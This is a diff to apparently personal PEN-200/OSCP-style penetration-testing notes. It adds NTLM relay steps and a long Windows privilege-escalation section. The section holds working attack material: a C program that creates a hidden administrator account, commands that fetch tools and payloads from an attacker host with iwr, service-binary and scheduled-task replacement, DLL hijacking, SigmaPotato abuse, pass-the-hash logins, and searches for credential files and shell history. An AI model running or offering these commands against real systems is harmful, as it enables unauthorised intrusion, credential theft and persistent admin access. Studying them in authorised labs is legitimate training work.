@@ -10,6 +10,7 @@
 - [Ports redirection and tunneling](#ports-redirection-and-tunneling)  
 - [Public exploit](#Public-exploit)  
 - [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
+- [Check/kill ports and containers](#check/kill-ports-and-containers)
 - [Kali built in wordlist and payloads](#kali-built-in-wordlist-and-payloads)
 - [Top tools and command](#top-tools-and-command)
 
@@ -251,6 +252,16 @@ Kali port:
   - DB
     - KeePass -m 13400 ($keepass$*1) `$keepass$*1*50000*0*375756b9e6c72891a8e5645a3338b8c`  
     - Atlassian (PBKDF2-HMAC-SHA1) -m 12001 `{PKCS5S2}NzIyNzM0NzY3NTIwNjI3MdDDis7wPxSbSzfFqDGf7u/L00kSEnupbz36XCL0m7wa`  
+
+# Check/kill ports and containers  
+- Ports
+  - List all listening ports `sudo netstat -tulnp`  
+  - check port usage `sudo lsof -i :<port>`  
+  - kill port `sudo kill -9 <PID>`  
+- Containers
+  - List running docker containers `docker ps`
+  - Stop a docker container `docker stop <container_id>`
+  - Remove a docker `docker rm <container_id>`  
 
 # Files transfer 
 [PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
@@ -741,7 +752,12 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - responder capturing the Net-NTLMv2 hash of paul.
     [SMB] NTLMv2-SSP Hash :paul::FILES01:1f9d4c51f6e74653:795F138EC6
   - `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`  #crack Net-NTLMv2 5600
-- Relaying Net-NTLMv2 (cannot run Mimikatz as an unprivileged user + failed to crack Net-NTLMv2 hash)  
+- Relaying Net-NTLMv2 (cannot run Mimikatz as an unprivileged user + failed to crack Net-NTLMv2 hash)
+  - Capture a user’s Net-NTLMv2 hash via SMB/HTTP request, then relay it to a target (e.g., SMB, LDAP, or HTTP) to gain access without knowing the password
+  - Check for SMB signing is required
+    `nmap --script smb2-security-mode -p445 <target>`
+  - Enumerate SBD shares
+    `smbclient -L \\\\<target> -N`
   - Starting ntlmrelayx for a Relay-attack targeting FILES02
     ```
     pwsh
@@ -761,30 +777,177 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     kali@kali:~$  nc 192.168.50.211 5555
     C:\Windows\system32>dir \\192.168.119.2\test
     ```
-  - receive an incoming connection in our ntlmrelayx tab
+  - receive an incoming connection in netcat listener.  
 - Windows credential guard  
   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)  
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
 
-# Windows Privilege Escalation  
+# Windows priviledge  
+- Bind shell to target , port xxx
+  `nc 192.168.124.220 4444` (Any TCP port: 4444, 1234)  
 - Enumerating windows
   ```
+  #Users
+  systeminfo
+  ipconfig /all
+  Get-Process
   whoami
-  
   whoami /user #S-<Revision>-<IdentifierAuthority>-<SubAuthority1>-<SubAuthority2>-...-<RID>
   S-1-5-21-2294905130-3135521385-938276-1001
-  
+  Get-LocalUser
+  net user steve
+  whoami /priv
+
+  #Group
   whoami /groups
   Get-LocalGroup
-  Get-LocalUser
-  whoami /priv
+  net user backupadmin
 
   #specific group
   Get-LocalGroupMember <adminteam>
   
   #specific member
+
+  #installed applications
+  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
+
+  displayname
+
+  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+  DisplayName   
   ```
-- ddd
+
+- User's note  
+  - KeePass DB: .kdbx
+    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+  - Text files: *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx
+    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
+  - XAMP: .ini
+    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+- Shell history
+  `(Get-PSReadlineOption).HistorySavePath type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`  
+- 🖥️ **Auotmated Enumeration - winPEASx64.exe**  
+  - Download winPEAS to target and execute  
+    ```
+    #kali
+    kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+    kali@kali:~$ python3 -m http.server 80
+    kali@kali:~$ nc 192.168.50.220 4444
+    
+    #target
+    C:\Users\dave> powershell
+    PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
+    C:\Users\dave> .\winPEAS.exe
+    ```
+ - Review "Basic System Information", "PS default transcripts history", "Users", "Looking for possible password files in users homes"
+- Leveraging Windows Services
+  - Service Binary
+    - check for allowing full Read and Write access of program
+      `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+    - check for non standard "C:\Windows\System32" path
+      `C:\xampp\apache\bin\httpd.exe`  
+      `C:\xampp\mysql\bin\mysqld.exe`  
+    - check permissions for the running program
+      `icacls "C:\xampp\apache\bin\httpd.exe"` #BUILTIN\Users:(F)
+    - create a malicious program to add user
+      ```
+      #include <stdlib.h>
+      
+      int main ()
+      {
+        int i;
+        
+        i = system ("net user dave2 password123! /add");
+        i = system ("net localgroup administrators dave2 /add");
+        
+        return 0;
+      }
+      ```
+    - cross-compile c code to 64bit app
+      `kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+    - Download to target
+      ```
+      PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  
+      PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe  
+      ```
+    - stop the service and restart it
+      `net stop mysql`
+    - reboot  
+      `shutdown /r /t 0`
+    - lower-privileged user replace the program with a malicious one
+  - 🖥️ **Auotmated Priviledge Escalation - PowerUp.sp1**
+    - Automates the enumeration of misconfigurations, weak permissions, and exploitable services. **Need bypass `powershell -ep bypass`**  
+    - Download PowerUp.ps1 to target and run it
+      ```
+      PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+      PS C:\Users\dave> powershell -ep bypass
+      PS C:\Users\dave>  . .\PowerUp.ps1
+      PS C:\Users\dave> Get-ModifiableServiceFile
+      ```
+    - `Get-ModifiableServiceFile`: Quick check. Targets services running as SYSTEM/admin and checks if the service binary or folder is writable by the current user.  
+    - `Invoke-AllChecks`: Comprehension check. Runs all PowerUp enumeration checks: services, scheduled tasks, DLL hijacks, token privileges, ACL misconfigurations, user/group info 
+    - Abuse the service
+      `Install-ServiceBinary -Name 'mysql'`  #might receive error then back to manual approach  (adduser.c)  
+  - DLL Hijacking
+    1. identify services running as SYSTEM or admin
+       `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+       ```
+       Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -eq 'Running'}
+       Import-Module .\PowerUp.ps1
+       Invoke-AllChecks | Out-String -Stream | Select-String "DLL Hijack"
+       ```
+    4. Find writable directory
+       `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`
+       `Get-ChildItem "C:\Program Files\<TargetService>\" | ForEach-Object { icacls $_.FullName }`  
+    6. Create malicious DLL (add_admin.cpp)
+       `x86_64-w64-mingw32-gcc <software>.cpp --shared -o <software>.dll`  
+    8. Deliver malicious DLL
+       `iwr -uri http://<KALI>/<software>.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\<software>.dll'`  
+    10. Trigger execution
+        `Restart-Service -Name <TargetService>`
+    12. stablize reverse shell
+        `python3 -c 'import pty; pty.spawn("/bin/sh")'`  
+    14. post-exploitation and check for lateral movement or sensitive files
+  - Unquoted Service Paths
+    - Windows service binaries that run with spaces in their path but without quotes.
+    - List Windows services with spaces in the path and missing quotes
+      `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`  
+      OR PowerUp tool `Get-ServiceUnquoted`  
+    - Check write permission
+      `icacls "C:\"` `icacls "C:\Program Files"` `icacls "C:\Program Files\Enterprise Apps"`  
+    - Replace the program with malicious adduser.exe
+      `iwr -uri http://<KALI>/adduser.exe -Outfile Current.exe`
+      `copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'`
+    - Trigger execution
+      `Start-Service <service>`
+    - check creation of users
+      `net user` `net localgroup administrators`
+    - OR PowerUp tool `Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`  
+- Scheduled Tasks
+  - List all scheduled tasks
+    `schtasks /query /fo LIST /v`  
+  - Check permission
+    `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`  
+  - Repalce the schedule task
+    ```
+    iwr -Uri http://<KALI>/adduser.exe -Outfile BackendCacheCleanup.exe
+    move .\BackendCacheCleanup.exe .\Pictures\
+    ```
+- Exploits for unpatched
+  - check current privilege
+    `whoami /priv`  
+  - enumerate windows version and security patches
+    `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
+  - search elevation of privileges CVE and download to target
+  - Execute the .\CVE-xxx-xxxx.exe and priviledge escalate  
+- 🖥️ **Priviledge Escalated Tool - SigmaPotato.exe**  
+  - Need "SeImpersonatePrivilege" priledge enabled
+  - `whoami /priv`  
+  - `.\SigmaPotato "net user dave4 lab /add"`
+  - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  
 
 # Active directory  
 
